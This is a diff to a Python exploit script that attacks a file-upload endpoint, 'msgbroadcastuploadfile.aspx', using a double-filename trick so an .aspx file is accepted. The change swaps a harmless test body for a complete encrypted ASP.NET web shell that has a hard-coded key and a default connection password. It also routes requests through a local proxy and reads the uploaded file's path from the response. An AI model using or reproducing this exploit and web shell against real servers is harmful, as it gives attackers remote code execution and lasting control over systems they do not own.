@@ -26,7 +26,7 @@ if len(sys.argv) != 5:
         '+-------------------------------------------------------------------------------------------------- --------+')
     sys.exit()
 proxysdata = {
-'http': '127.0.0.1:8080'
+'http': '127.0.0.1:8081'
 } 
 requests.packages.urllib3.disable_warnings()
 def exp(host,cookie):
@@ -45,14 +45,15 @@ def exp(host,cookie):
     }
     vulurl = url + "/gtp/im/services/group/msgbroadcastuploadfile.aspx"
     data="""------WebKitFormBoundaryFfJZ4PlAZBixjELj
-Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
+Content-Disposition: form-data; filename="2.aspx";filename="1.jpg"
 Content-Type: application/text
 
-test
+
+<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","6c58323f6bb99d2"); /*该密钥为连接密码32位md5值的前16位，默认连接密码hackbeybey*/byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
 
 ------WebKitFormBoundaryFfJZ4PlAZBixjELj--"""
     try:
-        r = requests.post(vulurl, data=data,headers=headers,verify=False)
+        r = requests.post(vulurl, data=data,headers=headers,verify=False,proxies=proxysdata)
         #print(r.text)
         if "success" in r.text :
             path = r.text.replace('\"',"").replace('{',"").replace('}',"").replace('\'',"").split('result:')[1]
